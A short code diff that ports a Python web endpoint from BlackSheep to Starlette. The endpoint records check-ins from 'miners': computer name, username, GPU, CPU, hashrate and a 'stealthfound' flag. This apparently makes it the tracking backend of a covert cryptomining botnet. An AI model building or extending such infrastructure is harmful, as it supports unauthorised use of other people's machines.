@@ -1,7 +1,5 @@
-from blacksheep.server.application import Application
-from blacksheep.server.responses import json, text
-from blacksheep.messages import Request
-from blacksheep.server.routing import Router
+from starlette.requests import Request
+from starlette.responses import RedirectResponse, HTMLResponse, PlainTextResponse
 
 from db.CRUD import Users, Miners
 
@@ -9,11 +7,8 @@ from db.CRUD import Users, Miners
 users_db = Users()
 miners_db = Miners()
 
-router = Router()
 
 
-
-@router.route("/endpoint", methods=["GET", "POST"])
 async def miners_endpoint(request: Request):
     if request.method == "POST":
         data = await request.json()
@@ -25,4 +20,4 @@ async def miners_endpoint(request: Request):
             await miners_db.update_miner(data['id'], data['computername'], data['username'], data['gpu'], data['cpu'], data['runtime'], data["hashrate"], stealthfound)
         else:
             await miners_db.add_miner(data['id'], data['computername'], data['username'], data['gpu'], data['cpu'], data['runtime'], data["hashrate"], stealthfound)
-    return text("Done")
+    return PlainTextResponse("Done")
